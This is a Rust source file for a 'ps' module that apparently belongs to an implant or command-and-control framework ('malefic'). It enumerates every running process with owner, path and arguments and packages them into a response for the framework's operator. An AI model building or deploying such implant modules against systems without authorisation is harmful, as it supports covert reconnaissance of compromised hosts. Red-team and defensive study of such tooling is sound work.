use crate::{Module, TaskResult, check_request, Result};
use malefic_proto::proto::implantpb::{spite::Body};
use async_trait::async_trait;
use malefic_proto::proto::modulepb;
use malefic_proto::proto::modulepb::PsResponse;
use malefic_trait::module_impl;

pub struct Ps {}

#[async_trait]
#[module_impl("ps")]
impl Module for Ps {}

#[async_trait]
impl crate::ModuleImpl for Ps {
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _sender: &mut crate::Output) -> Result {
        let _ = check_request!(receiver, Body::Request)?;
        
        let mut response = PsResponse::default();
        for (_, process) in malefic_helper::common::process::get_processes()?.into_iter(){
            response.processes.push(modulepb::Process{
                name: process.name,
                pid: process.pid,
                ppid: process.ppid,
                arch: process.arch,
                owner: process.owner,
                path: process.path,
                args: process.args,
                uid: "".to_string(),
            });
        }

        Ok(TaskResult::new_with_body(id, Body::PsResponse(response))) // 响应体为空
    }
}